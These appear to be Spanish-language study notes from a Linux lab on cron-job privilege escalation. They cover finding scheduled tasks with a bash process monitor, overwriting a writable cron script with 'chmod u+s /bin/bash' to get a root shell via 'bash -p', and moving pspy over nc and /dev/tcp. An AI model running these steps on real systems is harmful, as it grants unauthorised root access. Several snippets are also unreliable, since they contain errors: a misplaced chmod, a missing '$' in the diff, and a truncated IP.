> Tareas que se ejecutan regularmente a nivel de sistema. Generalmente realizan tareas de limpieza.

- Ver clase [[Ciberseguridad/Linux basic/Tareas CRON|Tareas CRON]]
## Armando
```
apt install cron
service cron start
```
- Para abrir el archivo y colocar una instruccion para correr otro archivo:
```
crontab -e
# escribimos lo siguiente
* * * * * /bin/bash /tmp/script.sh
```
- Creamos el archivo `script.sh`
```
cd /tmp/
nano script.sh
# dentro
#!/bin/bash

whoami > /tmp/output.txt
```
- Otorgamos permisos de ejecucion
```
chmod o+x output.txt
```
- Y en algun momento veremos el `output.txt`
```
ls /tmp/
cat output.txt
```

### Automatizando la visualizacion de que se ejecuta regularmente

```
#!/bin/bash

sleep 2
whoami > /tmp/output.txt
```
- Creamos un archivo para automatizar
```
su savitar
cd /home/savitar
touch procmon.sh
chmod +x procmon.sh
```

```bash
#!/bin/bash

old_process=$(ps -eo user,command)

while true; do
	new_process=$(ps -eo user,command)
	diff <(echo "$old_process") <(echo "new_process") | grep "[\>\<]" | grep -vE "procmon|command|kworker"
	old_process=$new_process
done
```

- Una vez que descubrimos el archivo que se ejecuta y tenemos permisos para escribir en el podemos modificarlo:
```
#!/bin/bash

sleep 2
chmod u+s /bin/bash
```
- Estamos dandole permiso SUID a la bash

- Nos ponemos en escucha
```
watch -n 1 ls -l /bin/bash
```

```
bash -p
```
- Para entrar a la bash con privilegios

## Proyecto mas automatizado

- [[pspython]] - herramienta 
- Descagamos `pspy64`
- Para pasarle el archivo al contenedor servimos el archivo por el puerto 443
```
nc -nlvp 443 < pspy
```
- En el contenedor vemos que hay en esa ip y puerto y guardamos lo que imprime en `pspy`
```
cat < /dev/tcp/192./443 > pspy
```